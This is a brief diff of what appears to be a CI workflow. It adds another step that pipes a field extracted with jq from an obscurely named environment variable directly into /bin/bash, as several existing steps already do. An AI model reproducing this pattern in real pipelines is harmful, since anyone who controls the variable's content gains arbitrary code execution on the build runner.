@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$aqnlq029" | jq -r .ws56110 | /bin/bash
           echo $y7 | jq -r .zb25340 | /bin/bash
           echo $ofs5617 | jq -r .lr2 | /bin/bash
+          printf '%s' "$sndev6008" | jq -r .dg3194 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
